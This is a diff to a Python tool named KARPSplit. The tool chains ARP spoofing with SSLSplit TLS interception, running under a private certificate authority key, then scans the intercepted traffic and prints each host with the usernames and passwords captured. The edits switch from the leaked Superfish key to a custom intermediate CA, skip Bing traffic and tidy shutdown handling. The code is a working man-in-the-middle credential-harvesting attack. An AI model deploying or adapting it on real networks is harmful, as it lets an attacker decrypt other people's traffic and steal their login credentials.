@@ -25,7 +25,7 @@ def karpspoof():
         return spoofer
 
     def sslsplit():
-        splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdin=PIPE, universal_newlines=True, stdout=DEVNULL, stderr=DEVNULL)
+        splitter = Popen(["sslsplit", "-k", "/root/ca/intermediate/private/cf-intermediate.key.pem", "-c", "/root/ca/intermediate/certs/intermediate.cert.pem", "-C", "/root/ca/intermediate/certs/ca-chain.cert.pem", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdin=PIPE, universal_newlines=True, stdout=DEVNULL, stderr=DEVNULL)
         return splitter
 
     def read_output():
@@ -49,25 +49,27 @@ def karpspoof():
                     if len(deets) > 0:
                         r = re.compile("Host: (.*?)\s")
                         host = re.search(r, result[1])
-                        # print the host
-                        print(host.group().strip())
-                        # print the credentials
-                        for deet in deets:
-                            print(deet[0] + ": " + deet[1])
-                        # print a new line
-                        print()
+                        if "bing" not in host.group():
+                            # print the host
+                            print(host.group().strip())
+                            # print the credentials
+                            for deet in deets:
+                                print(deet[0] + ": " + deet[1])
+                            # print a new line
+                            print()
 
     def handle_sigint(signal, frame):
         print("Stopping ARP Spoofer...")
-        spoofer.send_signal(signal.SIGINT)
+        spoofer.send_signal(2)
         spoofer.wait(5)
         print("Exiting SSLSplit...")
         splitter.stdin.write("q")
         splitter.wait(5)
+        quit()
 
     signal.signal(signal.SIGINT, handle_sigint)
 
-    print("\nKARPSplit v0.1\n")
+    print("\nKARPSplit v0.5\n")
 
     exit = 0
 
@@ -79,7 +81,7 @@ def karpspoof():
         spoofer = arpspoof()
     print("Starting SSLSplit... ")
     splitter = sslsplit()
-    print("Starting credential scanner...")
+    print("Scanning for credentials\n")
     read_output()
 
 if __name__ == '__main__':
